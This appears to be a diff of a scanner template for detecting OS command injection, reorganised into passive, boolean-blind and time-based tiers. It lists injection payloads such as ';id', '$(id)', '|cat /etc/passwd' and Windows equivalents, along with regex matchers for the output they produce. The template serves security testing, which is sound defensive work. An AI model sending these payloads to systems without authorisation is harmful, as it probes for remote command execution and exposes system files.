@@ -1,86 +1,103 @@
 id: generic-command-injection
 info:
-  name: Command Injection
-  severity: critical
-  description: Generic OS command injection testing
+  name: Command Injection - Multi-Tier
+  description: OS command injection with output, blind, and time-based detection
   tags:
     - rce
     - command-injection
     - generic
+    - blind
 
 generic:
   endpoint: "{{command_injection}}"
-
   method: GET
+  parameter: "q"
 
-  parameter: "ip"
+  # Multi-tier detection for command injection
+  detection_tiers:
+    # Tier 1: PASSIVE - Output-based detection
+    - tier: passive
+      detection_type: error_based
+      payloads:
+        - ";id"
+        - "|id"
+        - "&id"
+        - "&&id"
+        - "`id`"
+        - "$(id)"
+        - "' && id && echo '"
+        - "' | id '"
 
-  payloads:
-    - name: "pipe_ls"
-      value: "; ls"
-      description: "Semicolon with ls"
+      matchers:
+        - type: regex
+          condition: or
+          regex:
+            - "uid=\\d+.*gid=\\d+"
+            - "root:x:0:0"
+            - "www-data|apache|nobody|_www"
+            - "total\\s+\\d+"
+            - "drwxr-xr-x|drw-rw-rw"
+            - "COMMAND_EXECUTED"
+            - "uname|linux|darwin"
 
-    - name: "pipe_whoami"
-      value: "; whoami"
-      description: "Semicolon with whoami"
+    # Tier 2: ACTIVE - Boolean-based detection
+    - tier: active
+      detection_type: boolean_blind
+      baseline_payload: "test"
+      true_payload: "test && echo TRUE"
+      false_payload: "test && echo FALSE"
 
-    - name: "backtick_whoami"
-      value: "`whoami`"
-      description: "Backtick command substitution"
+      matchers:
+        - type: word
+          words:
+            - "TRUE"
+          condition: and
 
-    - name: "dollar_ls"
-      value: "$(ls)"
-      description: "Dollar sign command substitution"
+    # Tier 3: AGGRESSIVE - Time-based detection (causes delays)
+    - tier: aggressive
+      detection_type: time_blind
+      threshold_ms: 3000
+      payloads:
+        - ";sleep 3"
+        - "|sleep 3"
+        - "&&sleep 3"
+        - "';sleep 3;'"
+        - "|`sleep 3`"
+        - "$(sleep 3)"
 
-    - name: "and_ampersand"
-      value: "&& ls"
-      description: "AND operator with ls"
+      matchers:
+        - type: regex
+          condition: or
+          regex:
+            - "uid="
+            - "root:x"
+          negative: true
 
-    - name: "pipe_operator"
-      value: "| cat /etc/passwd"
-      description: "Pipe to read passwd"
+    # Additional payloads for different OS
+    - tier: aggressive
+      detection_type: error_based
+      payloads:
+        # Unix/Linux
+        - ";ls -la"
+        - "|cat /etc/passwd"
+        - "`whoami`"
+        - "$(pwd)"
+        # Windows
+        - "&dir"
+        - "|type C:\\Windows\\win.ini"
+        - "&whoami"
+        - "&ipconfig"
+        # Blind indicators
+        - ";echo COMMAND_INJECT"
+        - "|echo COMMAND_INJECT"
+        - "&ping -c 1 127.0.0.1 &"
 
-    - name: "semicolon_passwd"
-      value: "; cat /etc/passwd"
-      description: "Semicolon to read passwd"
-
-    - name: "backtick_id"
-      value: "`id`"
-      description: "Backtick with id command"
-
-    - name: "newline_injection"
-      value: "%0aid"
-      description: "Newline injection"
-
-    - name: "url_encoded_pipe"
-      value: "%7Cls%7C"
-      description: "URL encoded pipe"
-
-  matchers:
-    # Primary matcher: requires SPECIFIC command output patterns
-    # Note: 'condition: and' here sets the combining rule for ALL matchers below
-    - type: regex
-      regex:
-        - "uid=\\d+.*gid=\\d+"       # id command output: uid=1000 gid=1000
-        - "root:x:0:0.*/bin/bash"  # /etc/passwd with shell
-        - "drwxr-xr-x.*\\s+\\d+\\s+"  # ls output with permissions and size
-        - "www-data|apache|nobody"  # Common web server users
-      condition: and
-
-    # Secondary matcher: ls header format
-    - type: regex
-      regex:
-        - "total\\s+\\d+"  # "total 42" - ls directory header
-
-    # Negative matcher: exclude if page contains common web elements
-    # (indicates the match is just in page content, not command output)
-    - type: word
-      words:
-        - "<!DOCTYPE html"
-        - "<html"
-        - "<head>"
-        - "Shopify.routes"
-        - "component-"
-        - "application/json"
-        - "css"
-      negative: true
+      matchers:
+        - type: regex
+          condition: or
+          regex:
+            - "COMMAND_INJECT"
+            - "uid=\\d+"
+            - "root:x:0:0"
+            - "Volume|Windows IP"
+            - "\\[.*?\\]"
